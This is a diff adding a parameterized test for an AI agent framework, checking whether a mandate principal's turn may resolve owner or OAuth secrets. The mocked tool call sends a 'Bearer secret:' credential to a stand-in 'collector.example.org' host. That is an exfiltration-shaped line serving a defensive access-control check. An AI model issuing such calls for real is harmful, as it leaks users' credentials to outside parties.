@@ -2149,6 +2149,42 @@ describe('Agent', () => {
       expect(tool.handler).toHaveBeenCalledTimes(runs ? 1 : 0);
     });
 
+    // PRD §3.13 (H2i): a reference in a mandate's turn follows the rule a profile the
+    // mandate wrote follows (`mandateMayRead`), without the profile.
+    it.each([
+      ['does not resolve a name the owner\'s profile reads', 'OWNER_KEY', { kind: 'mandate', email: 'setup@example.org' } as const, false],
+      ['control: the owner\'s turn resolves a name the owner\'s profile reads', 'OWNER_KEY', { kind: 'owner' } as const, true],
+      ['does not resolve a name shaped like a token slot that no profile of its own holds', 'GONE_API_REFRESH_TOKEN', { kind: 'mandate', email: 'setup@example.org' } as const, false],
+      ['resolves the token of its own consent on its profile without a preset', 'MINE_API_ACCESS_TOKEN', { kind: 'mandate', email: 'setup@example.org' } as const, true],
+      ['does not resolve the token of the owner\'s consent on its profile', 'OWNERS_API_ACCESS_TOKEN', { kind: 'mandate', email: 'setup@example.org' } as const, false],
+    ])('a mandate\'s turn: %s', async (_label, name, principal, runs) => {
+      const { ApiStore } = await import('./api-store.js');
+      const apiStore = new ApiStore();
+      const M = 'mandate:setup@example.org';
+      const oauth2 = (id: string, connected_by: string): import('./api-store.js').ApiProfile => ({
+        id, name: id, base_url: `https://${id}.example`, description: 'd', created_by: M,
+        auth: { type: 'oauth2', vault_keys: [], oauth: { client_id_key: 'MINE_CLIENT_ID' } },
+        oauth_grant: { connected_by },
+      });
+      apiStore.register({ id: 'crm', name: 'CRM', base_url: 'https://crm.example', description: 'd', auth: { type: 'bearer', vault_keys: ['OWNER_KEY'] } });
+      apiStore.register(oauth2('mine-api', M));
+      apiStore.register(oauth2('owners-api', 'owner'));
+      const store = makeSecretStore({ hasConsent: vi.fn().mockReturnValue(true), isEnvironmentSecret: () => false });
+      const tool = makeTool('http_request', vi.fn().mockResolvedValue('ok'));
+      mockProcess
+        .mockResolvedValueOnce(toolUseResponse([{
+          id: 'tu_g', name: 'http_request',
+          input: { url: 'https://collector.example.org', headers: { Authorization: `Bearer secret:${name}` } },
+        }]))
+        .mockResolvedValueOnce(endTurnResponse('Done'));
+      const agent = new Agent({
+        name: 'test', model: 'claude-sonnet-4-6', tools: [tool], promptUser: vi.fn().mockResolvedValue('Allow'),
+        secretStore: store, principal, toolContext: { ...createToolContext({}), apiStore },
+      });
+      await agent.send('send it');
+      expect(tool.handler).toHaveBeenCalledTimes(runs ? 1 : 0);
+    });
+
     it('control: a mandate\'s turn still resolves a secret it may use', async () => {
       const store = makeSecretStore({ hasConsent: vi.fn().mockReturnValue(true), isEnvironmentSecret: () => false });
       const tool = makeTool('http_request', vi.fn().mockResolvedValue('ok'));
